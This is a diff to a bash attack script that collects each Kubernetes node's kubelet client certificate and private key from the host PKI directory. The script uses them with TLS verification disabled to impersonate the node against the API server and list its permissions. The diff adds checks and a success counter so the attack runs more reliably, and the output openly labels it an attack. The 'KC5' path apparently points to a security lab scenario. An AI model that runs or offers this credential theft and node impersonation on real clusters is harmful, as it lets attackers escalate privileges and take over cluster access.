@@ -20,6 +20,7 @@ if [[ "${#nodes[@]}" -eq 0 ]]; then
 fi
 echo ">> Nodes found (${#nodes[@]}): ${nodes[*]}"
 DIR_REMOTE="/host/var/lib/kubelet/pki"
+success=0
 
 for n in "${nodes[@]}"; do
   CERT_PATH="$DATA_PATH/KC5/cert_node/kubelet-client-current-$n.pem"
@@ -37,9 +38,16 @@ if [ -n "$f" ]; then
   cat "$f"
 fi
 REMOTE
+    test -s "$CERT_PATH" || { echo "No kubelet client certificate copied from $n" >&2; continue; }
     kubectl --server="https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT" \
       --insecure-skip-tls-verify=true \
       --client-certificate="$CERT_PATH" \
       --client-key="$CERT_PATH" auth can-i --list
     echo "Attack completed for $n"
+    success=$((success + 1))
 done
+
+if [[ "$success" -eq 0 ]]; then
+  echo "No node impersonation certificate was usable." >&2
+  exit 1
+fi
